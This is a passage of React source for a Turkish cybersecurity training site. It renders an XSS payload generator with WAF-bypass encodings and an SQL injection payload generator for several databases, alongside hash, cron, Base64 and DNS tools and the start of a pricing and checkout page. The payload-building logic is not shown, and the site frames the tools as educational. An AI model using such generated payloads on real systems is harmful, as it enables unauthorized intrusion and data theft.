                                  <button onClick={() => handleCopy(h.val, 'hash-' + h.label)} className="absolute right-2 top-2 px-2 py-1 bg-black border border-[#103a26] text-[10px] text-[#74998a] hover:text-[#00ff88] hover:border-[#00ff88] rounded transition-all">
                                    {copied === 'hash-' + h.label ? '✓' : '📋'}
                                  </button>
                                )}
                              </div>
                            ))}
                          </div>
                        </div>
                      </div>

                      {/* Right: Detector */}
                      <div>
                        <h3 className="text-lg font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2">Hash Tanımlayıcı & Analizör</h3>
                        
                        <div className="space-y-4">
                          <div>
                            <label className="block text-sm text-[#cdeede] mb-2 font-mono">Bilinmeyen Hash İmzası</label>
                            <input value={detectInput} onChange={e => setDetectInput(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" placeholder="Taramak istediğiniz hash değerini girin…" />
                          </div>

                          {detectedHashes ? (
                            <div className="space-y-3.5">
                              <div className="text-xs font-mono text-[#74998a]">Bulunan Eşleşmeler:</div>
                              {detectedHashes.map((res, i) => (
                                <div key={i} className="border border-[#103a26] rounded-xl p-4 bg-[rgba(0,255,136,.02)] space-y-2">
                                  <div className="flex justify-between items-center">
                                    <span className="font-disp font-bold text-[#eafff5] text-sm">{res.name}</span>
                                    <span className={`text-[10px] font-mono px-2 py-0.5 rounded border ${
                                      res.conf === 'Çok Yüksek' ? 'border-emerald-500/20 text-emerald-400 bg-emerald-500/5' :
                                      res.conf === 'Yüksek' ? 'border-[#00ff88]/20 text-[#00ff88] bg-[#00ff88]/5' :
                                      res.conf === 'Orta' ? 'border-yellow-500/20 text-yellow-400 bg-yellow-500/5' :
                                      'border-red-500/20 text-red-400 bg-red-500/5'
                                    }`}>{res.conf} Eşleşme</span>
                                  </div>
                                  <p className="text-xs text-[#74998a] leading-relaxed font-mono">{res.desc}</p>
                                </div>
                              ))}
                            </div>
                          ) : (
                            <div className="text-center py-10 border border-dashed border-[#103a26] rounded-xl text-sm text-[#74998a] font-mono">
                              Tanımlamak istediğiniz hash değerini yapıştırın.
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {slug === 'xss-generator' && (
                  <div>
                    <h1 className="text-2xl font-bold text-[#eafff5] mb-2">🧪 XSS Payload Oluşturucu</h1>
                    <p className="text-[#74998a] text-sm mb-6">Farklı XSS bağlamlarına (HTML, Öznitelik, Javascript) ve WAF filtre atlatma yöntemlerine uygun dinamik payload'lar üretin.</p>
                    
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                      <div>
                        <label className="block text-sm text-[#cdeede] mb-2 font-mono">Payload Tipi / Bağlamı</label>
                        <select value={xssPayloadType} onChange={e => setXssPayloadType(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm">
                          <option value="html">HTML Etiketi (&lt;script&gt;)</option>
                          <option value="img">Görsel Olay Tetikleyici (&lt;img onerror&gt;)</option>
                          <option value="svg">SVG Olay Tetikleyici (&lt;svg onload&gt;)</option>
                          <option value="body">Gövde Yükleme Olayı (&lt;body onload&gt;)</option>
                          <option value="iframe">Iframe Kaynağı (&lt;iframe src=javascript&gt;)</option>
                          <option value="attribute">Etiket Özniteliği Çıkışı (" onmouseover=)</option>
                          <option value="javascript-context">Javascript Dize Bağlamı ('-alert()-')</option>
                          <option value="polyglot">XSS Polyglot (Çoklu Bağlam)</option>
                        </select>
                      </div>
                      <div>
                        <label className="block text-sm text-[#cdeede] mb-2 font-mono">Filtre Atlatma (WAF Bypass)</label>
                        <select value={xssFilterBypass} onChange={e => setXssFilterBypass(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm">
                          <option value="none">Yok (Düz Metin)</option>
                          <option value="html-entity">HTML Entity (Ondalık Kodlama)</option>
                          <option value="string-fromcharcode">String.fromCharCode() Dönüşümü</option>
                          <option value="url">URL Encoding (Yüzde Kodlama)</option>
                        </select>
                      </div>
                    </div>

                    <div className="mb-6">
                      <label className="block text-sm text-[#cdeede] mb-2 font-mono">Çalıştırılacak JavaScript Kodu</label>
                      <input value={xssCustomParam} onChange={e => setXssCustomParam(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" placeholder="alert(document.domain)" />
                    </div>

                    <div className="relative mb-6">
                      <div className="flex justify-between text-xs font-mono uppercase text-[#5c8a74] mb-2">
                        <span>Oluşturulan XSS Payload</span>
                        <span>{getXssPayload().length} karakter</span>
                      </div>
                      <div className="absolute right-3 top-8 z-10">
                        <button onClick={() => handleCopy(getXssPayload(), 'xss')} className="px-2.5 py-1.5 bg-[#020806] border border-[#103a26] text-[#00ff88] hover:border-[#00ff88] rounded text-xs font-mono transition-colors">
                          {copied === 'xss' ? '✓ Kopyalandı!' : '📋 Kopyala'}
                        </button>
                      </div>
                      <pre className="bg-[#020806] border border-[#103a26] rounded-xl p-5 pt-12 overflow-x-auto text-sm text-[#eafff5] font-mono whitespace-pre-wrap break-all min-h-[100px]">
                        {getXssPayload()}
                      </pre>
                    </div>

                    <div className="rounded-xl border border-[#103a26] p-4 bg-[rgba(0,255,136,.02)] text-xs text-[#74998a] space-y-2 leading-relaxed">
                      <div className="font-bold text-[#00ff88]">💡 Güvenlik Bilgisi:</div>
                      <div>XSS (Cross-Site Scripting), saldırganın hedef web sitesine zararlı istemci taraflı betikler enjekte etmesine olanak tanır. Filtre atlatma modları, girdi doğrulama mekanizmalarını veya web uygulama güvenlik duvarlarını (WAF) test etmek ve aşmak amacıyla kullanılır.</div>
                    </div>
                  </div>
                )}

                {slug === 'sqli-generator' && (
                  <div>
                    <h1 className="text-2xl font-bold text-[#eafff5] mb-2">💉 SQL Injection Jeneratörü</h1>
                    <p className="text-[#74998a] text-sm mb-6">Farklı veritabanı yönetim sistemlerine (DBMS) ve SQL enjeksiyon türlerine uygun test payload'ları hazırlayın.</p>
                    
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                      <div>
                        <label className="block text-sm text-[#cdeede] mb-2 font-mono">Hedef Veritabanı (DBMS)</label>
                        <select value={sqliDbms} onChange={e => setSqliDbms(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm">
                          <option value="mysql">MySQL / MariaDB</option>
                          <option value="postgresql">PostgreSQL</option>
                          <option value="mssql">Microsoft SQL Server</option>
                          <option value="oracle">Oracle Database</option>
                        </select>
                      </div>
                      <div>
                        <label className="block text-sm text-[#cdeede] mb-2 font-mono">SQL Injection Tipi</label>
                        <select value={sqliType} onChange={e => setSqliType(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm">
                          <option value="auth">Kimlik Doğrulama Bypass (Auth Bypass)</option>
                          <option value="union">Birlik Tabanlı (Union Based)</option>
                          <option value="error">Hata Tabanlı (Error Based)</option>
                          <option value="time">Zaman Tabanlı (Time Based / Blind)</option>
                          <option value="blind">Boolean Kör Enjeksiyon (Blind Boolean)</option>
                        </select>
                      </div>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
                      {sqliType === 'union' && (
                        <div>
                          <label className="block text-sm text-[#cdeede] mb-2 font-mono">Sütun Sayısı</label>
                          <input type="number" value={sqliCols} onChange={e => setSqliCols(Math.max(1, parseInt(e.target.value) || 1))} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" min="1" max="100" />
                        </div>
                      )}
                      {(sqliType === 'union' || sqliType === 'error' || sqliType === 'blind') && (
                        <div>
                          <label className="block text-sm text-[#cdeede] mb-2 font-mono">Sorgulanacak Bilgi / Fonksiyon</label>
                          <input value={sqliDbName} onChange={e => setSqliDbName(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" placeholder="database()" />
                        </div>
                      )}
                      {sqliType === 'union' && (
                        <div>
                          <label className="block text-sm text-[#cdeede] mb-2 font-mono">Hedef Tablo (Opsiyonel)</label>
                          <input value={sqliTable} onChange={e => setSqliTable(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" placeholder="users" />
                        </div>
                      )}
                    </div>

                    <div className="relative mb-6">
                      <div className="flex justify-between text-xs font-mono uppercase text-[#5c8a74] mb-2">
                        <span>SQL Injection Test Payload</span>
                        <span>{getSqliPayload().length} karakter</span>
                      </div>
                      <div className="absolute right-3 top-8 z-10">
                        <button onClick={() => handleCopy(getSqliPayload(), 'sqli')} className="px-2.5 py-1.5 bg-[#020806] border border-[#103a26] text-[#00ff88] hover:border-[#00ff88] rounded text-xs font-mono transition-colors">
                          {copied === 'sqli' ? '✓ Kopyalandı!' : '📋 Kopyala'}
                        </button>
                      </div>
                      <pre className="bg-[#020806] border border-[#103a26] rounded-xl p-5 pt-12 overflow-x-auto text-sm text-[#eafff5] font-mono whitespace-pre-wrap break-all min-h-[100px]">
                        {getSqliPayload()}
                      </pre>
                    </div>

                    <div className="rounded-xl border border-[#103a26] p-4 bg-[rgba(0,255,136,.02)] text-xs text-[#74998a] space-y-2 leading-relaxed">
                      <div className="font-bold text-[#00ff88]">💡 Eğitim Notu:</div>
                      <div>SQL Injection (SQLi), veri tabanına gönderilen sorgulara dışarıdan müdahale edilerek yetkisiz veri okuma, yazma veya sunucu üzerinde komut çalıştırma zafiyetidir. Güvenli kod yazımında parametrik sorgular (Prepared Statements) kullanılarak önlenir.</div>
                    </div>
                  </div>
                )}

                {slug === 'cron-explainer' && (
                  <div>
                    <h1 className="text-2xl font-bold text-[#eafff5] mb-2">⏰ Cron Zamanlayıcı & Açıklayıcı</h1>
                    <p className="text-[#74998a] text-sm mb-6">Cron ifadelerini Türkçe doğal dilde analiz edin veya görsel seçiciler yardımıyla sıfırdan cron zamanlamaları tasarlayın.</p>
                    
                    <div className="flex gap-2 mb-6">
                      <button onClick={() => setCronInputMode('interactive')} className={`px-4 py-2 border font-mono text-xs rounded-lg transition-colors ${cronInputMode === 'interactive' ? 'bg-[rgba(0,255,136,.1)] border-[#00ff88] text-[#00ff88]' : 'border-[#103a26] text-[#74998a] hover:text-[#cdeede]'}`}>Görsel Oluşturucu</button>
                      <button onClick={() => setCronInputMode('manual')} className={`px-4 py-2 border font-mono text-xs rounded-lg transition-colors ${cronInputMode === 'manual' ? 'bg-[rgba(0,255,136,.1)] border-[#00ff88] text-[#00ff88]' : 'border-[#103a26] text-[#74998a] hover:text-[#cdeede]'}`}>Manuel İfade Girişi</button>
                    </div>

                    {cronInputMode === 'interactive' ? (
                      <div className="grid grid-cols-2 sm:grid-cols-5 gap-4 mb-6">
                        <div>
                          <label className="block text-xs font-mono uppercase text-[#5c8a74] mb-2">Dakika</label>
                          <select value={cronMin} onChange={e => setCronMin(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-3 py-2 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-xs">
                            <option value="*">Her Dakika (*)</option>
                            <option value="*/5">5 Dk'da Bir (*/5)</option>
                            <option value="*/15">15 Dk'da Bir (*/15)</option>
                            <option value="0">Saat Başında (0)</option>
                            <option value="30">Yarım Saatte (30)</option>
                          </select>
                        </div>
                        <div>
                          <label className="block text-xs font-mono uppercase text-[#5c8a74] mb-2">Saat</label>
                          <select value={cronHour} onChange={e => setCronHour(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-3 py-2 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-xs">
                            <option value="*">Her Saat (*)</option>
                            <option value="*/2">2 Saatte Bir (*/2)</option>
                            <option value="12">Öğlen 12'de (12)</option>
                            <option value="0">Gece 00'da (0)</option>
                            <option value="9-17">Mesai Saatleri (9-17)</option>
                          </select>
                        </div>
                        <div>
                          <label className="block text-xs font-mono uppercase text-[#5c8a74] mb-2">Gün (Ayın)</label>
                          <select value={cronDay} onChange={e => setCronDay(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-3 py-2 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-xs">
                            <option value="*">Her Gün (*)</option>
                            <option value="1">Ayın 1. Günü (1)</option>
                            <option value="15">Ayın 15. Günü (15)</option>
                            <option value="1-15">Ayın İlk Yarısı (1-15)</option>
                          </select>
                        </div>
                        <div>
                          <label className="block text-xs font-mono uppercase text-[#5c8a74] mb-2">Ay</label>
                          <select value={cronMonth} onChange={e => setCronMonth(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-3 py-2 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-xs">
                            <option value="*">Her Ay (*)</option>
                            <option value="*/3">3 Ayda Bir (*/3)</option>
                            <option value="1">Ocak (1)</option>
                            <option value="6">Haziran (6)</option>
                          </select>
                        </div>
                        <div>
                          <label className="block text-xs font-mono uppercase text-[#5c8a74] mb-2">Gün (Haftanın)</label>
                          <select value={cronDow} onChange={e => setCronDow(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-3 py-2 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-xs">
                            <option value="*">Her Gün (*)</option>
                            <option value="1-5">Hafta İçi (1-5)</option>
                            <option value="0,6">Hafta Sonu (0,6)</option>
                            <option value="1">Pazartesi (1)</option>
                            <option value="5">Cuma (5)</option>
                          </select>
                        </div>
                      </div>
                    ) : (
                      <div className="mb-6">
                        <label className="block text-sm text-[#cdeede] mb-2 font-mono">Cron İfadesi (5 Sütunlu)</label>
                        <input value={cronManualInput} onChange={e => setCronManualInput(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#00ff88] focus:border-[#00ff88] focus:outline-none font-mono text-sm" placeholder="*/5 * * * *" />
                      </div>
                    )}

                    <div className="border border-[#0c2719] bg-[#020806] rounded-xl p-5 mb-6 font-mono">
                      <div className="flex justify-between items-center border-b border-[#0c2719] pb-3 mb-3">
                        <div>
                          <span className="text-[10px] text-[#74998a] uppercase tracking-wider block">Cron Zamanlama İfadesi</span>
                          <span className="text-lg font-bold text-[#eafff5]">{cronManualInput}</span>
                        </div>
                        <button onClick={() => handleCopy(cronManualInput, 'cron')} className="px-2.5 py-1.5 bg-black border border-[#103a26] text-[#00ff88] hover:border-[#00ff88] rounded text-xs transition-colors">
                          {copied === 'cron' ? '✓ Kopyalandı!' : '📋 Kopyala'}
                        </button>
                      </div>
                      <div>
                        <span className="text-[10px] text-[#74998a] uppercase tracking-wider block mb-1">Türkçe Doğal Dil Açıklaması</span>
                        <p className="text-sm text-[#00ff88] leading-relaxed">{explainCron(cronManualInput)}</p>
                      </div>
                    </div>

                    <div className="border border-[#103a26] bg-black/40 rounded-xl p-5 font-mono text-xs space-y-3">
                      <h3 className="text-sm font-bold text-[#eafff5] mb-2">Cron Yapısı Kılavuzu</h3>
                      <div className="grid grid-cols-[100px_1fr] gap-2">
                        <span className="text-[#00ff88] font-bold">* * * * *</span>
                        <span className="text-[#74998a]">Sırasıyla: Dakika Saat Gün Ay Haftanın_Günü</span>
                      </div>
                      <div className="grid grid-cols-[100px_1fr] gap-2 border-t border-[#0c2719]/40 pt-2">
                        <span className="text-[#cdeede]">/ Karakteri:</span>
                        <span className="text-[#74998a]">Adımları veya sıklığı belirtir (Örn: */15 = her 15 dakikada bir)</span>
                      </div>
                      <div className="grid grid-cols-[100px_1fr] gap-2 border-t border-[#0c2719]/40 pt-2">
                        <span className="text-[#cdeede]">- Karakteri:</span>
                        <span className="text-[#74998a]">Aralıkları belirtir (Örn: 9-17 = saat 9 ile 17 arası her saat)</span>
                      </div>
                      <div className="grid grid-cols-[100px_1fr] gap-2 border-t border-[#0c2719]/40 pt-2">
                        <span className="text-[#cdeede]">, Karakteri:</span>
                        <span className="text-[#74998a]">Liste değerleri ayırır (Örn: 1,3,5 = sadece Pazartesi, Çarşamba ve Cuma)</span>
                      </div>
                    </div>
                  </div>
                )}

                {slug === 'base64-file' && (
                  <div>
                    <h1 className="text-2xl font-bold text-[#eafff5] mb-2">📁 Base64 Dosya Dönüştürücü</h1>
                    <p className="text-[#74998a] text-sm mb-6">Dosyalarınızı ve görsellerinizi yerel olarak Base64 metin koduna çevirin veya Base64 kodlarını tekrar orijinal dosyaya dönüştürerek indirin.</p>
                    
                    <div className="flex gap-2 mb-6">
                      <button onClick={() => setB64ToolMode('encode')} className={`px-4 py-2 border font-mono text-xs rounded-lg transition-colors ${b64ToolMode === 'encode' ? 'bg-[rgba(0,255,136,.1)] border-[#00ff88] text-[#00ff88]' : 'border-[#103a26] text-[#74998a] hover:text-[#cdeede]'}`}>Dosyayı Base64'e Çevir</button>
                      <button onClick={() => setB64ToolMode('decode')} className={`px-4 py-2 border font-mono text-xs rounded-lg transition-colors ${b64ToolMode === 'decode' ? 'bg-[rgba(0,255,136,.1)] border-[#00ff88] text-[#00ff88]' : 'border-[#103a26] text-[#74998a] hover:text-[#cdeede]'}`}>Base64'ü Dosyaya Çevir</button>
                    </div>

                    {b64ToolMode === 'encode' ? (
                      <div className="space-y-6">
                        {/* File Upload Dropzone */}
                        <div className="border-2 border-dashed border-[#103a26] hover:border-[#00ff88] rounded-xl p-8 text-center bg-[#020806]/40 cursor-pointer relative group transition-colors">
                          <input type="file" onChange={handleFileSelect} className="absolute inset-0 w-full h-full opacity-0 cursor-pointer" />
                          <div className="text-3xl mb-3">📤</div>
                          <p className="text-[#eafff5] font-mono text-sm font-bold mb-1">Dosya Seçin veya Sürükleyin</p>
                          <p className="text-[#74998a] text-xs">Maksimum önerilen dosya boyutu: 10MB</p>
                        </div>

                        {b64FileName && (
                          <div className="border border-[#0c2719] bg-[#020806] rounded-xl p-4 font-mono text-xs space-y-2">
                            <div className="text-[#5c8a74] border-b border-[#0c2719] pb-1.5 uppercase font-bold">Dosya Bilgileri</div>
                            <div className="flex justify-between">
                              <span className="text-[#74998a]">Dosya Adı:</span>
                              <span className="text-[#eafff5] font-bold">{b64FileName}</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-[#74998a]">Dosya Boyutu:</span>
                              <span className="text-[#eafff5] font-bold">{(b64FileSize / 1024).toFixed(2)} KB</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-[#74998a]">MIME Türü:</span>
                              <span className="text-[#eafff5] font-bold">{b64FileType || 'Bilinmiyor'}</span>
                            </div>
                          </div>
                        )}

                        {b64Encoded && (
                          <div className="relative">
                            <div className="flex justify-between text-xs font-mono uppercase text-[#5c8a74] mb-2">
                              <span>Base64 Veri Çıktısı (Data URL)</span>
                              <span>{b64Encoded.length} karakter</span>
                            </div>
                            <div className="absolute right-3 top-8 z-10">
                              <button onClick={() => handleCopy(b64Encoded, 'b64enc')} className="px-2.5 py-1.5 bg-[#020806] border border-[#103a26] text-[#00ff88] hover:border-[#00ff88] rounded text-xs font-mono transition-colors">
                                {copied === 'b64enc' ? '✓ Kopyalandı!' : '📋 Kopyala'}
                              </button>
                            </div>
                            <textarea readOnly value={b64Encoded} rows="8" className="w-full bg-[#020806] border border-[#103a26] rounded-xl p-4 pt-12 text-[#00ff88] focus:outline-none font-mono text-xs resize-none" placeholder="Base64 çıktısı…"></textarea>
                          </div>
                        )}
                      </div>
                    ) : (
                      <div className="space-y-6">
                        <div>
                          <label className="block text-sm text-[#cdeede] mb-2 font-mono">Base64 Metin Verisi (Data URL veya Düz Metin)</label>
                          <textarea value={b64DecodeText} onChange={e => setB64DecodeText(e.target.value)} rows="8" className="w-full bg-[#020806] border border-[#103a26] rounded-xl p-4 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-xs resize-none" placeholder="Buraya Base64 kodunu girin (Örn: data:image/png;base64,iVBOR...) veya düz base64 dizesini yapıştırın…"></textarea>
                        </div>

                        <button onClick={handleBase64Decode} className="w-full py-3 font-mono font-bold text-[#021008] bg-[#00ff88] rounded-lg hover:shadow-[0_0_20px_-4px_var(--glow)] transition-all">Dosyayı Çöz ve İndir 📥</button>
                      </div>
                    )}
                  </div>
                )}

                {slug === 'dns-lookup' && (
                  <div>
                    <h1 className="text-2xl font-bold text-[#eafff5] mb-2">📡 DNS & SPF DMARC Analizörü</h1>
                    <p className="text-[#74998a] text-sm mb-6">Herhangi bir alan adının DNS (A, MX, TXT) kayıtlarını sorgulayın ve e-posta sahteciliği korumalarını (SPF, DMARC) test edin.</p>
                    
                    <div className="flex gap-2 mb-6">
                      <input value={dnsDomain} onChange={e => setDnsDomain(e.target.value)} className="flex-1 bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" placeholder="alanadi.com" />
                      <button onClick={runDnsQuery} disabled={dnsLoading} className="px-6 py-2.5 font-mono font-bold text-[#021008] bg-[#00ff88] hover:bg-[#5cffba] disabled:bg-[#3d564b] disabled:text-[#74998a] rounded-lg transition-colors flex items-center gap-2">
                        {dnsLoading ? (
                          <>
                            <span className="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin"></span>
                            Sorgulanıyor...
                          </>
                        ) : 'Sorgula 🔍'}
                      </button>
                    </div>

                    {dnsResults && (
                      <div className="space-y-6">
                        {/* Status Banners */}
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                          {dnsResults.risks.map((risk, idx) => (
                            <div key={idx} className={`border rounded-xl p-4 font-mono flex flex-col justify-between ${risk.color}`}>
                              <div>
                                <div className="flex justify-between items-center mb-2">
                                  <span className="text-[10px] uppercase tracking-wider opacity-80">Güvenlik Durumu</span>
                                  <span className="text-xs font-bold uppercase">{risk.status}</span>
                                </div>
                                <h4 className="text-sm font-bold text-[#eafff5] mb-1">{risk.title}</h4>
                                <p className="text-xs opacity-90 leading-relaxed">{risk.desc}</p>
                              </div>
                            </div>
                          ))}
                        </div>

                        {/* A and MX Records */}
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                          {/* A Records */}
                          <div className="border border-[#103a26] bg-[#020806] rounded-xl p-5">
                            <h3 className="text-sm font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2">A Kayıtları (IP Adresleri)</h3>
                            {dnsResults.a && dnsResults.a.length > 0 ? (
                              <div className="space-y-2 font-mono text-xs">
                                {dnsResults.a.map((rec, idx) => (
                                  <div key={idx} className="flex justify-between border-b border-[#0c2719]/40 pb-1.5">
                                    <span className="text-[#74998a]">{rec.name}</span>
                                    <span className="text-[#00ff88] font-bold select-all">{rec.data}</span>
                                  </div>
                                ))}
                              </div>
                            ) : (
                              <div className="text-center py-6 text-xs text-[#74998a] font-mono">A kaydı bulunamadı.</div>
                            )}
                          </div>

                          {/* MX Records */}
                          <div className="border border-[#103a26] bg-[#020806] rounded-xl p-5">
                            <h3 className="text-sm font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2">MX Kayıtları (Mail Sunucuları)</h3>
                            {dnsResults.mx && dnsResults.mx.length > 0 ? (
                              <div className="space-y-2 font-mono text-xs">
                                {dnsResults.mx.map((rec, idx) => (
                                  <div key={idx} className="flex justify-between border-b border-[#0c2719]/40 pb-1.5">
                                    <span className="text-[#74998a] truncate pr-4">{rec.name}</span>
                                    <span className="text-[#cdeede] font-bold select-all">{rec.data}</span>
                                  </div>
                                ))}
                              </div>
                            ) : (
                              <div className="text-center py-6 text-xs text-[#74998a] font-mono">MX kaydı bulunamadı.</div>
                            )}
                          </div>
                        </div>

                        {/* TXT Records */}
                        <div className="border border-[#103a26] bg-[#020806] rounded-xl p-5">
                          <h3 className="text-sm font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2">Tüm TXT Kayıtları</h3>
                          {dnsResults.txt && dnsResults.txt.length > 0 ? (
                            <div className="space-y-3 font-mono text-xs">
                              {dnsResults.txt.map((rec, idx) => (
                                <div key={idx} className="border-b border-[#0c2719]/40 pb-2 last:border-0 last:pb-0">
                                  <div className="text-[10px] text-[#74998a] mb-1">{rec.name}</div>
                                  <div className="text-[#cdeede] select-all break-all">{rec.data}</div>
                                </div>
                              ))}
                            </div>
                          ) : (
                            <div className="text-center py-6 text-xs text-[#74998a] font-mono">TXT kaydı bulunamadı.</div>
                          )}
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>

            {/* Legal Disclaimer / Yasal Uyarı */}
            <div className="mt-8 rounded-xl border border-yellow-500/20 bg-[rgba(234,179,8,.02)] p-4 text-xs font-mono text-yellow-500/80 leading-relaxed">
              <strong>⚠️ YASAL UYARI & SORUMLULUK REDDİ:</strong> Bu platformda sunulan tüm siber güvenlik araçları; yalnızca eğitim, siber güvenlik farkındalığı oluşturma ve yetkili sızma testi (penetrasyon) çalışmaları amacıyla geliştirilmiştir. Bu araçların izinsiz veya yasa dışı sistemlerde kullanılmasından doğabilecek tüm cezai ve hukuki sorumluluk tamamen kullanıcıya aittir. <code>siberkampus.com</code> hiçbir kötü niyetli kullanımda sorumluluk kabul etmez.
            </div>

          </div>
        </section>
      )}
    </>
  );
};

/* ============ PRICING PAGE ============ */
const PricingPage = ({ navigate }) => {
  const HeaderCmp = window.SKHeader || (() => null);
  const FooterCmp = window.SKFooter || (() => null);
  const useUser = window.SKuseUser || (() => [null]);
  const [user] = useUser();
  const isLoggedIn = !!localStorage.getItem('sk_token');

  const [showCheckout, setShowCheckout] = useState(null);
  const [checkoutStep, setCheckoutStep] = useState(1); // 1=bilgi, 2=ödeme(iframe), 3=sonuç
  const [showLegal, setShowLegal] = useState(null);
  const [agreed, setAgreed] = useState({ mesafeli: false, onbilgi: false, iade: false });
  const [checkoutEmail, setCheckoutEmail] = useState('');
  const [checkoutName, setCheckoutName] = useState('');
  const [checkoutPhone, setCheckoutPhone] = useState('');
  const [checkoutAddress, setCheckoutAddress] = useState('');
  const [paytrToken, setPaytrToken] = useState(null);
  const [merchantOid, setMerchantOid] = useState(null);
  const [demoMode, setDemoMode] = useState(false);
  const [loading, setLoading] = useState(false);
  const [checkoutError, setCheckoutError] = useState('');

  const plans = [
    {
      id: 'vip-platform',
      name: 'VIP Platform Erişimi',
      tag: '🔥 ÇOK POPÜLER',
      price: 900,
      oldPrice: 1800,
      period: 'Yıllık Program',
      img: '/freeeducationiamge-fiyatlandırma.jpg',
      features: [
        '**10+ Siber Güvenlik Saldırı/Savunma Videosu**',
        '**600+ Uzmanlaştırılmış Test Sorusu**',
        '**60+ İnteraktif Konu Anlatımı**',
        'Web, Wi-Fi ve Sistem Güvenliği Modülleri',
        'Ağ ve Uygulama Güvenliği Sertifikaları',
        '1\'e 1 Canlı Ön Görüşme (Hediye)'
      ],
      cta: 'WhatsApp ile Satın Al ⚡',
      popular: true,
      accent: '#00ff88'
    },
    {
      id: 'one-on-one',
      name: "1'e 1 VIP Mentorluk & Özel Ders",
      tag: '🔥 VIP SEÇENEK',
      price: 14000,
      oldPrice: 28000,
      period: 'Aylık Program',
      img: '/mentoregitimi-fiyatlandırma.jpg',
      features: [
        '**Bire Bir Canlı Ders & Canlı Mentorluk**',
        'Aylık Eğitim (Toplam 12 Saat)',
        'Siber Kampüs VIP Platform Erişiminin Tamamı',
        'Eğitmenle Özel Direkt Chat Hattı (7/24)',
        'Kişiye Özel Çalışma ve İlerleme Planı',
        'CV Hazırlama & Mülakat Desteği'
      ],
      cta: 'WhatsApp ile İletişime Geç ⚡',
      popular: false,
      accent: '#ffd166'
    }
  ];

  const handlePlanClick = (plan) => {
    if (plan.id === 'level-test') {
      navigate('level-test');
      return;
    }
    if (plan.id === 'vip-platform') {
      const phone = '905389351189';
      const msg = encodeURIComponent('Merhaba, yıllık 900 TL olan VIP Platform Erişimi paketini satın almak ve hesabımı aktifleştirmek istiyorum.');
      window.open(`https://wa.me/${phone}?text=${msg}`, '_blank');
      return;
    }
    if (plan.id === 'one-on-one') {
      const phone = '905389351189';
      const msg = encodeURIComponent('Merhaba, 1\'e 1 VIP Mentorluk & Özel Ders eğitimi almak istiyorum.');
      window.open(`https://wa.me/${phone}?text=${msg}`, '_blank');
      return;
    }
  };

  const openCheckoutModal = (plan) => {
    setShowCheckout(plan);
    setCheckoutStep(1);
    setCheckoutError('');
    setDemoMode(false);
    setPaytrToken(null);
    setMerchantOid(null);
    setAgreed({ mesafeli: false, onbilgi: false, iade: false });
    // Kullanıcı giriş yapmışsa bilgileri önceden doldur
    const u = window.__SK_USER;
    if (isLoggedIn && u && u.name !== 'Misafir') {
      setCheckoutName(u.name || '');
      const storedEmail = localStorage.getItem('sk_user_email') || '';
      setCheckoutEmail(storedEmail);
    } else {
      setCheckoutName('');
      setCheckoutEmail('');
    }
  };

  const handleStartPayment = async () => {
    if (!agreed.mesafeli || !agreed.onbilgi || !agreed.iade) {
      setCheckoutError('Lütfen tüm sözleşmeleri onaylayın.');
      return;
    }
    if (!checkoutEmail || !checkoutName) {
      setCheckoutError('E-posta ve ad soyad zorunludur.');
      return;
    }
    if (!checkoutPhone || checkoutPhone.length < 10) {
      setCheckoutError('Geçerli bir telefon numarası girin (5XX XXX XX XX).');
      return;
    }
    if (!checkoutAddress || checkoutAddress.trim().length < 10) {
      setCheckoutError('Lütfen adresinizi girin.');
